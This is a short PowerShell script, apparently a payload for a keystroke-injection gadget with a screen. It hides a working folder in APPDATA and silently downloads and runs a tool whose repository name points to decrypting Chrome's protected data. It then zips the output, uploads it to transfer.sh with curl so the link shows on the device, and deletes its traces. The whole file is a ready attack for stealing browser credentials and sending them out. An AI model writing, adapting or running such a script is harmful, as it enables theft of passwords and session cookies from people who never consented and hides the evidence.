$work = "$env:APPDATA\Microsoft\HiddenFolder"
if (!(Test-Path $work)) { New-Item -ItemType Directory -Path $work -Force }

$exe = "$work\chromelevator.exe"
(New-Object System.Net.WebClient).DownloadFile('https://github.com/DUptain1993/Chrome-App-Bound-Encryption-Decryption/releases/latest/download/chromelevator_x64.exe', $exe)

# Run silently, wait for it to finish
Start-Process -FilePath $exe -ArgumentList "all -o `"$work\out`"" -WindowStyle Hidden -Wait

$zip = "$work\evidence.zip"
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory("$work\out", $zip)

# This is what you will see on your T-Embed screen
Write-Output "UPLOADED:"
curl --upload-file "$zip" https://transfer.sh/evidence.zip

# Clean up behind you
Remove-Item -Path $zip, $exe, "$work\out" -Recurse -Force
